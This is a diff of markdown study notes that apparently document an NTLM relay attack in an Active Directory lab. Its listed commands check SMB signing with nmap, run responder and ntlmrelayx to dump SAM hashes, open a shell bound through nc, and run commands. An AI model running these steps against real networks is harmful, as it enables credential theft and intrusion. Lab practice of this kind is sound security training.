@@ -52,27 +52,27 @@ Other Wins:
 
 1. see if smb signing is enabled or not 
    `nmap --script=smb2-security-mode.nse -p445 192.167.138.136 -Pn  `  (Can also put CIDR in place of IP to sweep the whole subnet - 192.167.138.0/24)
-   Domain Controller: enabled but required
+   Domain Controller: enabled but required  
    ![Pasted image 20251127201150](images/Pasted-image-20251127201150.png)
-   Machine 1: enabled but not required
+   Machine 1: enabled but not required  
    ![Pasted image 20251127201923](images/Pasted-image-20251127201923.png)
-   Machine 2: enabled but not required
+   Machine 2: enabled but not required  
    ![Pasted image 20251128023531](images/Pasted-image-20251128023531.png)
-3. Make the targets.txt file - put the two machine's IP addresses
-4. Change responder config - SMB -> OFF and HTTP -> OFF
-5. run responder - `sudo responder -I eth0 -dwPv`
-6. Setup ntlmrelay - `sudo ntlmrelayx.py -tf targets.txt -smb2support`
-7. Event..........
+2. Make the targets.txt file - put the two machine's IP addresses
+3. Change responder config - SMB -> OFF and HTTP -> OFF
+4. run responder - `sudo responder -I eth0 -dwPv`
+5. Setup ntlmrelay - `sudo ntlmrelayx.py -tf targets.txt -smb2support`
+6. Event..........  
 ![Pasted image 20251128105342](images/Pasted-image-20251128105342.png)
-8. SAM Hash.....  
+7. SAM Hash.....  
 ![Pasted image 20251128105552](images/Pasted-image-20251128105552.png)
-9. use -i on ntlmrelayx to get a shell on the same event  
+8. use -i on ntlmrelayx to get a shell on the same event  
 ![Pasted image 20251128105735](images/Pasted-image-20251128105735.png)
 
    then need to bind using NC......  
    ![Pasted image 20251128105955](images/Pasted-image-20251128105955.png)
 
-10. use `-c "whoami"` or anything after `-c` to run a command, which in this case is whoami  
+9. use `-c "whoami"` or anything after `-c` to run a command, which in this case is whoami  
 ![Pasted image 20251128155052](images/Pasted-image-20251128155052.png)
 
 
